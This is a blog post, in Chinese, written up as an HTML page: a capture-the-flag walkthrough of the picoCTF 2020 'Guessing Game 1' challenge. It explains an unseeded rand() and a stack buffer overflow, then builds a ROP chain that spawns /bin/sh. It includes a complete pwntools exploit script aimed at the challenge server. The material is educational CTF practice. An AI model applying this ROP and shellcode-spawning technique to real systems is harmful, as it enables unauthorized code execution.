@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="這題目花了我好幾個小時 https:&#x2F;&#x2F;play.picoctf.org&#x2F;events&#x2F;3&#x2F;challenges&#x2F;challenge&#x2F;90 開始我們先看看 Makefile 1234all:  gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.cclean:  rm vuln  這個程式可能有 Buffer Overf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoCTF 2020 Guessing Game 1">
+<meta property="og:url" content="http://example.com/picoCTF%202020%20Guessing%20Game%201/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="這題目花了我好幾個小時 https:&#x2F;&#x2F;play.picoctf.org&#x2F;events&#x2F;3&#x2F;challenges&#x2F;challenge&#x2F;90 開始我們先看看 Makefile 1234all:  gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.cclean:  rm vuln  這個程式可能有 Buffer Overf">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-10-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-25T13:32:35.211Z">
+<meta property="article:author" content="Wilson Lu">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PicoCTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>picoCTF 2020 Guessing Game 1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021%20AIS3%20Pre-Exam%20%E8%B3%BD%E5%BE%8C%E5%BF%83%E5%BE%97/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E5%B8%B8%E7%94%A8%20Latex/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/picoCTF%202020%20Guessing%20Game%201/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&text=picoCTF 2020 Guessing Game 1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&is_video=false&description=picoCTF 2020 Guessing Game 1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=picoCTF 2020 Guessing Game 1&body=Check out this article: http://example.com/picoCTF%202020%20Guessing%20Game%201/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&name=picoCTF 2020 Guessing Game 1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/picoCTF%202020%20Guessing%20Game%201/&t=picoCTF 2020 Guessing Game 1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B"><span class="toc-number">1.</span> <span class="toc-text">開始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%BA%E5%AE%9A%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">決定攻擊手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B7%A8%E5%AF%AB-ROP-chain"><span class="toc-number">3.</span> <span class="toc-text">編寫 ROP chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%AB%E5%AD%98%E5%99%A8%E5%B0%BA%E5%AF%B8"><span class="toc-number">4.</span> <span class="toc-text">暫存器尺寸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E6%9E%9C"><span class="toc-number">5.</span> <span class="toc-text">成果</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        picoCTF 2020 Guessing Game 1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Wilson Lu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-10-13T16:00:00.000Z" class="dt-published" itemprop="datePublished">2020-10-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/PicoCTF/">PicoCTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PicoCTF/" rel="tag">PicoCTF</a>, <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <span id="more"></span>
+
+<p>這題目花了我好幾個小時</p>
+<p><a target="_blank" rel="noopener" href="https://play.picoctf.org/events/3/challenges/challenge/90">https://play.picoctf.org/events/3/challenges/challenge/90</a></p>
+<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我們先看看 Makefile</p>
+<figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">all:</span></span><br><span class="line">  gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">  rm vuln</span><br></pre></td></tr></table></figure>
+
+<p>這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got</p>
+<p>看看 <code>do_stuff</code> 和 <code>get_random</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">get_random</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> rand() % BUFSIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">do_stuff</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">long</span> ans = get_random();</span><br><span class="line">  ans = increment(ans);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What number would you like to guess?\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> guess[BUFSIZE];</span><br><span class="line">  fgets(guess, BUFSIZE, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> g = atol(guess);</span><br><span class="line">  <span class="keyword">if</span> (!g) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s not a valid number!\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g == ans) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congrats! You win! Your prize is this print statement!\n\n&quot;</span>);</span><br><span class="line">      res = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Nope!\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>輸入用 <code>fgets</code>，沒有 Buffer Overflow</p>
+<p>但 <code>rand</code> 沒有初始化，它的值一直是固定的</p>
+<p>用 gdb 可以很快找到 <code>ans</code> 的值</p>
+<p>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;random_num.png)<br><code>ans</code> 固定為 <code>84</code></p>
+<blockquote>
+<p>補注: 截圖沒有截到 <code>rax</code>，但是 <code>rax</code> 應是 84</p>
+</blockquote>
+<p>可以進到 <code>win</code> 裡面了<br>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;access_first_level.png)</p>
+<h2 id="決定攻擊手法"><a href="#決定攻擊手法" class="headerlink" title="決定攻擊手法"></a>決定攻擊手法</h2><p><code>win</code> 裡面有 Buffer Overflow，明明 <code>BUFSIZE</code> 只有 100，卻可以填 360 個字元</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BUFSIZE = 100</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">win</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> winner[BUFSIZE];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New winner!\nName? &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(winner, <span class="number">360</span>, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Congrats %s\n\n&quot;</span>, winner);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到 padding<br>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;offset.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br></pre></td></tr></table></figure>
+
+<p>問題來了，我們可以用什麼方法破解它?</p>
+<ol>
+<li>Shellcode<br><br>不行，有開 NX</li>
+<li>return to libc<br><br>它用 static link</li>
+<li>Format string<br><br>printf 看起來不能利用</li>
+<li>ROP<br><br>好像可以</li>
+</ol>
+<p><strong>決定用 ROP</strong></p>
+<h2 id="編寫-ROP-chain"><a href="#編寫-ROP-chain" class="headerlink" title="編寫 ROP chain"></a>編寫 ROP chain</h2><p>使用 ROPgadget<br>找不到 <code>pop eax</code>，只有 <code>pop rax</code><br>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;cannot_find_pop_eax.png)</p>
+<p>把 <code>/bin/sh</code> 放到 <code>.bss</code> 段</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += flat([pop_rax, buf, pop_rdx, <span class="string">&#x27;/bin&#x27;</span>, mov_drax_edx, \</span><br><span class="line">                 pop_rax, buf+<span class="number">4</span>, pop_rdx, <span class="string">&#x27;/sh\x00&#x27;</span>, mov_drax_edx])</span><br></pre></td></tr></table></figure>
+
+<p>system call execve 參數</p>
+<ul>
+<li>eax: 11</li>
+<li>ebx: 字串 <code>/bin/sh</code> 的位置</li>
+<li>ecx: 0</li>
+<li>edx: 0</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += flat([pop_rbx, buf, pop_rax, <span class="number">11</span>, pop_rdx, <span class="number">0</span>, int_0x80])</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rcx 找不到適合的 gadget，只好先不理它，反正它常常是 0</p>
+</blockquote>
+<blockquote>
+<p>想知道更多 system call 用法，可以到這個網站<br><a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86">https://syscalls.w3challs.com/?arch=x86</a></p>
+</blockquote>
+<h2 id="暫存器尺寸"><a href="#暫存器尺寸" class="headerlink" title="暫存器尺寸"></a>暫存器尺寸</h2><p>原本以為沒事了，沒想到…<br>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;reg_size_problem.png)<br>輸入的資料會黏在一起</p>
+<p>我們輸入的是 32-bit，但卻用 64-bit 的暫存器，所以必須在資料後面加上 4 個<code>\x00</code></p>
+<p>如果你用 flat，可以在每個指令後面都加入一個 0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flat([pop_rbx, <span class="number">0</span>, buf, <span class="number">0</span>, pop_rax, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, int_0x80, <span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;jupiter.challenges.picoctf.org&#x27;</span>, <span class="number">39936</span>)</span><br><span class="line"></span><br><span class="line">s = r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;84&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x6bc3a0</span></span><br><span class="line">pop_rax = <span class="number">0x4163f4</span></span><br><span class="line">pop_rbx = <span class="number">0x400ed8</span></span><br><span class="line">pop_rdx = <span class="number">0x44a6b5</span></span><br><span class="line">mov_drax_edx = <span class="number">0x48dd72</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41b570</span></span><br><span class="line">int_0x80 = <span class="number">0x468fea</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload += flat([pop_rax, <span class="number">0</span>, buf, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, <span class="string">&#x27;/bin&#x27;</span>,<span class="number">0</span> , mov_drax_edx, <span class="number">0</span>,</span><br><span class="line">                 pop_rax, <span class="number">0</span>, buf+<span class="number">4</span>, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, <span class="string">&#x27;/sh\x00&#x27;</span>,<span class="number">0</span> , mov_drax_edx, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rbx, <span class="number">0</span>, buf, <span class="number">0</span>, \</span><br><span class="line">                 pop_rax, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, int_0x80, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># 有夠醜</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>![](&#x2F;picoCTF 2020 Guessing Game 1&#x2F;final.png)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B"><span class="toc-number">1.</span> <span class="toc-text">開始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%BA%E5%AE%9A%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">決定攻擊手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B7%A8%E5%AF%AB-ROP-chain"><span class="toc-number">3.</span> <span class="toc-text">編寫 ROP chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%AB%E5%AD%98%E5%99%A8%E5%B0%BA%E5%AF%B8"><span class="toc-number">4.</span> <span class="toc-text">暫存器尺寸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E6%9E%9C"><span class="toc-number">5.</span> <span class="toc-text">成果</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/picoCTF%202020%20Guessing%20Game%201/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&text=picoCTF 2020 Guessing Game 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&is_video=false&description=picoCTF 2020 Guessing Game 1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=picoCTF 2020 Guessing Game 1&body=Check out this article: http://example.com/picoCTF%202020%20Guessing%20Game%201/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&title=picoCTF 2020 Guessing Game 1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/picoCTF%202020%20Guessing%20Game%201/&name=picoCTF 2020 Guessing Game 1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/picoCTF%202020%20Guessing%20Game%201/&t=picoCTF 2020 Guessing Game 1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Wilson Lu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
